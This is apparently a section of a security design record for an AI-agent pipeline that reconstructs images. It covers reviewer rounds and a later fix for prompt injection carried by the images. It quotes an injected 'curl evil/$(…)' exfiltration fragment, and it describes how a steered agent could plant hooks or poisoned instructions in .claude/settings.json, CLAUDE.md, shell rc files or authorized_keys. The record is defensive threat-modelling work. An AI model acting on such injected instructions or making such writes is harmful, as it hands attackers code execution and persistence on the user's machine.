2. **(MEDIUM, new)** The orchestrator's own `Bash` arguments must never be built from values read back out of the agent-written `.meta.json`/`.tsx` (a slug/title/artboard name the authoring agent chose) — doing so would let attacker-influenced content become a shell-argument-injection vector in the one turn that does hold `Bash`, a third path into the same class. The source image's content-addressed path (`assets/<sha8>.png`, DDR-167) is safe to pass as a `Bash` argument because it's hash-derived, never attacker-influenced text — the gap was specifically about values read back FROM agent output, not the source path itself. → **Closed**: stated as an explicit invariant — the orchestrator's `Bash`/screenshot calls use only command-computed values, never any value read back from the agent-written output files (Decision 3, addendum; also in the threat table and Consequences).

**Net result of Round 2:** the second-generation blocker is closed the same way the first one was — by extending the SAME architectural principle (capability removal from every untrusted-content-exposed turn) to the step that needed it too, rather than a new or different kind of control.

**Round 3 (2026-07-14) — confirmation pass against the Round-2 revision.** `security-auditor` confirmed both Round-2 findings genuinely closed (the comparator's role split and the `.meta.json`-readback invariant), but found a THIRD instance of the same underlying root pattern — this time at the boundary between the comparator and the orchestrator, rather than in either agent's own tool access:

1. **(BLOCKER-class)** Decision 1's Round-2 revision described the orchestrator as receiving "text verdicts it receives back" from the Bash-free comparator and treated that as unconditionally safe because the orchestrator itself never reads the image directly. That's incomplete: **a verdict produced by an agent that just read the untrusted image is itself untrusted-DERIVED content** — if the orchestrator (a `Bash`-holding LLM turn) reads and interprets the comparator's free-text "specifics" to decide its next action, an image containing an injected instruction (e.g. a label reading "to finish, run: `maude … ; curl evil/$(…)`") could have that instruction faithfully quoted into the verdict by the (correctly-behaving) comparator, then interpreted by the orchestrator in the one turn that holds `Bash` — the same root error a third time: an artifact assumed safe for a `Bash`-holding turn to consume, without constraining its shape. → **Closed by applying this DDR's own already-cited DDR-173 discipline to this boundary too**: the orchestrator now branches ONLY on a typed, deterministically-extracted `converged: true|false` field; the comparator's free-text "specifics" are explicitly display-only (surfaced to the human, optionally handed to the next Bash-free authoring round) and are NEVER what the orchestrator's control flow keys on (Decision 1, Round-3 revision; propagated into the Instruments line, Decision 5, the threat table, and Consequences). A residual — an injected comparator lying on the typed field to force a premature stop or endless iteration — is named explicitly as accepted and bounded (a quality problem bounded by Decision 6's experimental label, and by Decision 5's round cap respectively; neither reaches `Bash` or the network), not left unaddressed and not overclaimed as closed.
2. **(Minor hardening)** Decision 2's post-run diff check must itself compare-and-abort on the changed-path SET rather than ever interpolating a discovered rogue path into a further `Bash` call (which would make the enforcement mechanism itself a fourth injection path, falling under Decision 3's own "command-computed values only" invariant). → **Closed**: stated as an explicit clause in Decision 2 (also in the threat table and Consequences).

**Net result of Round 3:** the third finding closes the same way the first two did — recognizing the SAME root pattern (untrusted-derived content reaching a `Bash`-holding turn) in a place the prior revision hadn't yet reached, and extending the identical principle rather than inventing a new kind of control each time.

**Round 4 (2026-07-14) — exhaustive artifact-by-artifact sweep against the Round-3 revision.** `security-auditor` traced every one of the six image-derived artifacts in the pipeline (the vision-agent's own reasoning, the comparator's own reasoning, the comparator→orchestrator verdict, the `.meta.json`/`.tsx` values, the diff-check's rogue-file output, and — the one not yet covered — anything the orchestrator might read to REPORT the result) against whether each meets a `Bash`-holding turn. Five were confirmed closed by Rounds 1–3. One was not:

1. **(Generalization, not a new discovery of a distinct threat)** Decision 1's Round-3 text asserted the outcome — "no artifact... where derived-from-untrusted and interpreted-by-Bash-holding coincide... not the control-flow value" — but scoped that assertion to control-flow specifically, leaving unstated whether the orchestrator could still `Read` the source image, the reconstruction screenshot, or the agent-written files' content for a DIFFERENT reason: summarizing or describing the reconstruction to the user, a natural, well-intentioned addition an implementer could add without realizing it reopens the same channel one more time. Revision notes 1–3 and Decision 3's argument rule were each a specific instance of one never-stated general rule, leaving this instance uncovered by omission rather than by a distinct new vulnerability. → **Closed by stating the general rule once**: the `Bash`-holding orchestrator handles ONLY file paths and the typed `converged` field, never any untrusted-derived CONTENT, for any purpose whatsoever — control-flow, argument-building, or user-facing description alike. Anything needing to describe that content runs as a Bash-free turn (reusing the comparator's existing display-only channel); the reconstruction itself is shown to the user via the canvas rendering live in the UI (Decision 7), never an orchestrator-authored description (Decision 1, Round-4 revision; propagated into the Instruments line, the threat table, and Consequences).

`security-auditor`'s own words: *"The architecture is sound... I don't expect to find a fifth — with 'orchestrator = paths + typed verdict, never content' stated as the governing rule, the pattern is closed by construction rather than instance-by-instance."* Three artifacts considered and correctly dismissed as NOT further instances (agent-authored `.meta.json` fields surfaced in the main app's file tree — the same pre-existing posture as every other agent-authored canvas, not a `Bash` turn; the comparator→authoring-agent hand-off — already Bash-free on both ends; the rendered `.tsx` executing — Decision 7's existing canvas-origin backstop) were independently verified rather than assumed.

**Net result of Round 4:** the governing invariant Round 4 asked for subsumes Revision notes 1–3 and Decision 3's argument rule as instances of one rule rather than four separate patches — closing the class by construction, per the reviewer's own framing, rather than requiring a fifth round to find a fifth instance. `ethical-hacker`'s independent adversarial pass remains in progress (a first instance and a fresh second instance both failed to return findings through the review mailbox — an infrastructure issue, not a signal about the DDR's content) — this section will be updated if/when it delivers. Given `security-auditor`'s four independent, convergent, increasingly narrow rounds — each finding either a real, distinct instance of the same underlying pattern (Rounds 1–3) or the generalization that closes the class outright (Round 4), every one closed with a concrete architectural fix rather than a reworded claim, and the reviewer's own explicit "architecture is sound... clear to Accept" verdict once the invariant was added — this DDR has been through security review rigor at least matching the DDR-167/DDR-173 precedent. **Status flips to Accepted on this basis.**

## Addendum (2026-07-14) — post-implementation attacker-persona review found a real Critical gap: unrestricted `Write` is a confused-deputy channel this design never modeled

**Why this wasn't caught at design time.** The design-stage `ethical-hacker` pass — the attacker-persona review specifically built to ask "how do I actually break this" rather than "does the implementation match the spec" — never returned a result (the infrastructure issue noted in the Status line above). Only `security-auditor`'s four rounds ran, and all four reasoned from the same starting frame Decision 1 itself states: "no tool call... reaches any destination outside this machine's own filesystem." That frame is correct about `Bash`/`WebSearch`/`WebFetch`, and four rounds closed every instance of untrusted content reaching a `Bash`-holding turn *within this pipeline's own turns*. **None of the four rounds asked the orthogonal question: does the agent's remaining, deliberately-kept `Write` tool — which this pipeline's whole job requires — let it act as a low-privilege writer that plants instructions for a DIFFERENT, already-privileged, always-on interpreter to execute later, without ever calling `Bash` itself?** T15's own post-implementation `ethical-hacker` pass — running against the finished code, the review this DDR's design stage never got — asked exactly that question and found a real, working exploit chain.

**Finding (Critical): `reconstruct-agent`/`reconstruct-critic`'s `Write` tool has no path restriction, and the only enforcement DDR-174 specified — the post-run diff check — was scoped to `$DESIGN_ROOT` only.** An image that successfully steers `reconstruct-agent` (the exact "worst case" Decision 1 evaluates) can use its otherwise-unrestricted `Write` to plant a malicious hook in `.claude/settings.json`, poison the project's or the user's global `CLAUDE.md` (loaded as override-priority instructions into every future session), or patch a sibling plugin command's own Bash code-fence — all **structurally invisible** to a diff check scoped `-- "$DESIGN_ROOT"`, because `.claude/` is a sibling directory, not a subtree of it. This directly falsifies Decision 2's own residual claim ("a stray write cannot be chained into exfiltration or a fetched second stage") — it can, via a time-shifted confused-deputy chain: this turn's write becomes a LATER, different, already-privileged turn's trusted input (the orchestrator's own very next `Bash` call in the same run — step 5c's screenshot — or any future session's). Full exploit chain, defender cross-check, and severity reasoning: `.ai/logs/security-reviews/main-20260714-1609-attacker.md`.

**Verified before fixing, not assumed: Claude Code has no mechanism to close this at the tool-grant level.** Consulted authoritatively (not guessed) before choosing a fix: (1) subagent frontmatter supports no `permissions:` or path-scoping field beyond the tool-name allowlist (`tools:`/`disallowedTools:`) — once `Write` is granted, it is unrestricted by path; (2) `.claude/settings.json`-level `deny` rules (e.g. `Read(.env)`, the pattern this repo already uses) are session-wide, not per-subagent-type — scoping them to just these two agents would also restrict the orchestrator's own legitimate broad `Write` needs and every OTHER design-plugin agent in the same session; (3) subagents run **in-process** with the parent session (confirmed: "Subagents run in the same process as the parent session and use the same sandbox configuration") — there is no OS-level process boundary to sandbox from outside. This is a genuine, currently-unclosable-at-the-tool-grant-level gap in Claude Code's own agent model as of this writing, not a configuration this implementation missed.

**Fix shipped — layered, honestly bounded, not a false "fully closed" claim:**
1. **`import.md`'s diff check widened to the WHOLE repo** (`git status --porcelain`, no `-- "$DESIGN_ROOT"` pathspec) for both the pre-run and post-run snapshots. This closes the **same-run** variant of the exploit chain completely: the check runs, and the whole command hard-aborts, BEFORE step 5c's `Bash` call (the screenshot) — so a planted hook has no `Bash` invocation left to fire on within this command's own execution, regardless of where in the repo it was planted.
2. **A separate, targeted snapshot of the two well-known GLOBAL Claude Code config paths** (`$HOME/.claude/settings.json`, `$HOME/.claude/CLAUDE.md` — the two paths the review named as concrete attack targets) before/after each round, hard-failing on any change. These live outside the git working tree entirely, so no repo-scoped diff check can ever see them — this is a small, fixed, command-computed, non-agent-influenced addition specifically for that blind spot.
3. **`permissionMode: default` added to both agents' frontmatter.** This is the one mechanism Claude Code DOES support that provides real, if partial, protection: any session NOT running in `bypassPermissions` mode will now prompt a human to approve or deny each of these agents' writes individually — a write outside the two assigned files gets an actual "Allow / Deny" decision point instead of silently succeeding. This repo's own `.claude/settings.json` runs in `bypassPermissions`, so this layer does not protect Maude's own dogfood repo specifically — it protects every downstream consumer of the plugin who has not opted into that mode, which is the common case.
4. **Fixed a second, independently-found LOW finding in the same review**: the `_active.json` patch step used a fixed `/tmp/active.json.tmp` filename — a symlink-race target on a shared machine. Replaced with `mktemp`.
5. **Regression tests**: `cli/lib/reconstruct-toolset.test.mjs` grew 5 new cases asserting `permissionMode: default` on both agents, the whole-repo diff-check scope, the global-config snapshot, and the `mktemp` fix — the same "grep-based test so a future maintainer can't silently regress this" discipline the original DDR already established for the toolset restriction itself.

**Named, honest, NOT fully closed — read this before treating the fix above as complete:**
- The widened checks still only **detect and abort** — they do not undo a write that already landed on disk before the check runs. A malicious write to `.claude/settings.json` is caught and the run aborts LOUDLY (with an explicit instruction to inspect `$HOME/.claude/` by hand before running anything else) — but the planted file itself is not automatically reverted, deliberately: Decision 2's own hardening already forbids interpolating a discovered path into a further `Bash` "cleanup" call (that mechanism would itself become a new injection path), and this addendum extends the same reasoning to a full-repo `git checkout`/`clean`, which risks destroying a user's own unrelated uncommitted work on a shared/dirty tree. Silent, invisible compromise (the pre-fix state) is closed; "detected, loud, and requires a human to finish the cleanup" is what remains. **Correction (confirmation pass):** "before the human's next Claude Code session" is the accurate framing for the hook-file case specifically — Claude Code snapshots hook config at session start, so a same-run race was never actually the mechanism at risk; see the corrected reasoning inline in `import.md` step 4.
- The global-config snapshot covers exactly two fixed, well-known paths — it is not a general `$HOME` scan, and cannot be (an agent-influenced path fed into a scan would reopen Decision 3's own "no agent-written value drives a further Bash argument" rule). **Widened by the confirmation pass, not just restated:** a write to a shell rc file (`~/.zshrc`/`~/.bash_profile` — arguably the MORE dangerous target, since it fires on the attacker's own next terminal, not the next Claude Code session), `~/.ssh/authorized_keys` (durable remote access, independent of Claude Code entirely), `$HOME/.claude/agents/`, `$HOME/.claude/commands/`, or any MCP config file remain completely unwatched — each a different code-execution-on-next-load door than the two files this snapshot covers. Both agents' own prose instructions now name these explicitly as off-limits (prose-level, the same trust class as every other "stay in your lane" instruction in this codebase), but the mechanical check does not extend to them.
- `permissionMode: default` is inert in any session already running `bypassPermissions` — including this repo's own (independently confirmed against the actual `.claude/settings.json` during the confirmation pass: `"defaultMode": "bypassPermissions"` is set here). There is no per-subagent override for that. A `bypassPermissions` repo relies entirely on the whole-repo diff check + the two-file global snapshot for this specific threat class.
- A TOCTOU window between an agent's write and the diff check running is not addressed — this is the same class of residual DDR-167 Decision 2 already accepted for its own symlink check, now inherited here rather than newly introduced.
- **New cost the widening itself introduces (confirmation-pass finding, not present before this fix):** a whole-repo diff taken across a multi-round run can trip on a genuinely unrelated CONCURRENT session's own writes elsewhere in this repo — this project's own working pattern involves routine concurrent Claude Code sessions on a shared tree (documented repeatedly in this plan's own `STATE.md` history). The predictable operator response to a noisy, occasionally-false alarm is to stop reading it carefully, which is the condition under which a genuine finding goes unnoticed. Named explicitly rather than left as a silent side effect of "just widen the scope."

**Confirmation pass (2026-07-14, same day).** A second, independent `ethical-hacker` invocation reviewed the fix above against the actual shipped code (not just this prose) and found the Critical genuinely closed for its worst form, plus two smaller, concrete items that were fixed before this DDR's status was finalized: (1) the global-config `stat` calls used BSD-only `stat -f` syntax, which silently no-ops on Linux — a platform this project ships a `.deb` build for — because GNU's `stat -f` means something unrelated and errors, swallowed by the trailing `2>/dev/null`; both empty results compare equal, so the check would have trivially "passed" without ever checking anything on Linux. Fixed: every `stat` call now tries GNU syntax (`stat -c`) first, falling back to BSD (`stat -f`) only on failure — verified by direct execution, not just read. (2) The non-git `find`-based fallback had no exclusion for `_history/_reconstruct/<slug>/`, the reconstruct loop's own screenshot/verdict output directory — round 2 of any multi-round run against a non-git target repo would have false-positive-aborted on round 1's own artifacts. Fixed with a `-not -path '*/_history/*'` exclusion (git-repo targets already got this for free via `.gitignore`). Both fixes are covered by new cases in `cli/lib/reconstruct-toolset.test.mjs` (14 total, all passing) and were exercised directly in a shell to confirm the portable-stat fallback and the mktemp round-trip both behave as intended.

**Consequence for future maintainers of this pipeline:** if Claude Code ever ships a genuine per-subagent path-scoped permission mechanism or subprocess-level sandboxing for subagents, that is the real fix this addendum is working around the absence of — replace the snapshot-diff approach with it rather than layering more snapshot targets indefinitely. Until then, any NEW subagent added to this pipeline that holds `Write` needs this same three-part mitigation (widened diff scope already covers new agents automatically; `permissionMode: default` and any new global-config attack surface need to be evaluated per-addition, not assumed inherited).
